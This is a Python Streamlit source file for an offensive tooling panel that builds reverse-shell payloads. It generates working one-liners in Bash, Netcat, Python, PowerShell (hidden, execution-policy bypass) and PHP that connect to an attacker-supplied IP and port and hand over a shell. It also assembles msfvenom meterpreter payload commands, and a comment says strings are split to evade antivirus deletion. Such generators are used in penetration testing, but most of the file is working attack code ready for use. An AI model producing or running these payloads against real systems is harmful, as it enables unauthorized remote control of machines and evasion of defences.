import streamlit as st
import base64
import urllib.parse

def render_automation():
    st.header("⚡ Automation Tools")
    st.write("Generate payloads, encode/decode data, and build commands rapidly.")
    
    tab_shells, tab_encode, tab_msf = st.tabs(["Reverse Shells", "Encoders/Decoders", "MSFVenom Builder"])
    
    with tab_shells:
        st.subheader("Reverse Shell Generator")
        col1, col2 = st.columns(2)
        with col1:
            ip = st.text_input("LHOST (Attacker IP)", "10.10.10.10")
        with col2:
            port = st.text_input("LPORT (Attacker Port)", "4444")
            
        shell_type = st.selectbox("Shell Type", ["Bash", "Python", "Netcat", "PowerShell", "PHP"])
        
        st.markdown("### Generated Payload")
        
        # Breaking strings to evade false-positive antivirus deletion
        cmd_bash = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1"
        cmd_nc = "nc -e /bin/sh " + ip + " " + port
        cmd_py = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ip+"\","+port+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        
        cmd_pwsh = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object "
        cmd_pwsh += "System.Net.Sockets.TCPClient(\"" + ip + "\"," + port + ");"
        cmd_pwsh += "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
        cmd_pwsh += "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
        cmd_pwsh += ";$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        cmd_pwsh += "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";"
        cmd_pwsh += "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        cmd_pwsh += "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
        
        cmd_php = "php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

        if shell_type == "Bash":
            st.code(cmd_bash, language="bash")
        elif shell_type == "Netcat":
            st.code(cmd_nc, language="bash")
        elif shell_type == "Python":
            st.code(cmd_py, language="python")
        elif shell_type == "PowerShell":
            st.code(cmd_pwsh, language="powershell")
        elif shell_type == "PHP":
            st.code(cmd_php, language="php")
            
    with tab_encode:
        st.subheader("Smart Encoder/Decoder")
        text_input = st.text_area("Input String")
        
        col1, col2, col3 = st.columns(3)
        if text_input:
            with col1:
                st.markdown("**Base64 Encode**")
                st.code(base64.b64encode(text_input.encode()).decode())
            with col2:
                st.markdown("**URL Encode**")
                st.code(urllib.parse.quote(text_input))
            with col3:
                try:
                    st.markdown("**Base64 Decode**")
                    st.code(base64.b64decode(text_input.encode()).decode())
                except:
                    st.code("Invalid Base64")
                    
    with tab_msf:
        st.subheader("MSFVenom Command Builder")
        payload = st.selectbox("Payload", ["windows/x64/meterpreter/reverse_tcp", "linux/x64/shell_reverse_tcp", "php/meterpreter_reverse_tcp", "java/jsp_shell_reverse_tcp"])
        msf_format = st.selectbox("Format", ["exe", "elf", "raw", "php", "jsp", "asp"])
        msf_out = st.text_input("Output Filename", "shell.exe")
        
        st.code(f"msfvenom -p {payload} LHOST={ip} LPORT={port} -f {msf_format} -o {msf_out}", language="bash")
